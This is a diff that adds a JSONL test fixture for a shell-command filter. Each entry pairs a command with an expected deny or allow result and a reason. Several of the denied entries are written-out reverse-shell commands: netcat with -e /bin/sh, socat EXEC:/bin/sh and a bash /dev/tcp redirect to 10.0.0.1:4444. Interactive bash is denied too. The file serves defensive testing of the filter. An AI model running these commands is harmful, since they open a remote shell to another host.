@@ -1,0 +1,20 @@
+{"expect":"deny","why":"the 13:02 kill — npm view piped into a JSON one-liner","cmd":"npm view aws-cdk-lib versions --json | python3 -c \"import json,sys; v=json.load(sys.stdin); print(v[-5:])\""}
+{"expect":"deny","why":"the 11:58 kill — gh api piped into a JSON one-liner","cmd":"gh api repos/aws/aws-cdk/pulls/32369 | python3 -c \"import json,sys; d=json.load(sys.stdin); print('merged_at:', d.get('merged_at'))\""}
+{"expect":"deny","why":"python2-style, no colon anywhere — COI would let this pass, we do not","cmd":"python -c \"print(1)\""}
+{"expect":"deny","why":"uppercase form still matches after lowercasing","cmd":"PYTHON3 -C \"print(1)\""}
+{"expect":"deny","why":"perl one-liner","cmd":"perl -e 'print 1'"}
+{"expect":"deny","why":"php one-liner","cmd":"php -r 'echo 1;'"}
+{"expect":"deny","why":"ruby one-liner","cmd":"ruby -e 'puts 1'"}
+{"expect":"deny","why":"interactive bash — bypasses COI's network gate, always fires","cmd":"bash -i"}
+{"expect":"deny","why":"interactive sh","cmd":"sh -i -c 'echo hi'"}
+{"expect":"deny","why":"netcat with exec","cmd":"nc -e /bin/sh 10.0.0.1 4444"}
+{"expect":"deny","why":"socat — and the 13:12 self-inflicted kill was a command carrying this","cmd":"socat TCP:10.0.0.1:4444 EXEC:/bin/sh"}
+{"expect":"deny","why":"bash tcp redirect","cmd":"bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444'"}
+{"expect":"deny","why":"documentation text is blocked too — deliberate over-block, use Write/Edit","cmd":"cat > notes.md <<'EOF'\nAvoid python3 -c in the container.\nEOF"}
+{"expect":"allow","why":"the sanctioned replacement — runs as 'python3 -', not on the list","cmd":"python3 - <<'PY'\nimport json\nprint(json.dumps({'a': 1}))\nPY"}
+{"expect":"allow","why":"jq is the preferred JSON tool and matches nothing","cmd":"jq -r '.tool_input.command' file.json"}
+{"expect":"allow","why":"ordinary git","cmd":"git status --short && git log --oneline -3"}
+{"expect":"allow","why":"the word python alone is not the pattern","cmd":"grep -c python requirements.txt"}
+{"expect":"allow","why":"a python script file, not -c","cmd":"python3 scripts/build.py --verbose"}
+{"expect":"allow","why":"non-interactive sh -c is fine; only sh -i fires","cmd":"sh -c 'echo hello'"}
+{"expect":"allow","why":"pnpm work","cmd":"CI=true pnpm install --reporter=append-only"}
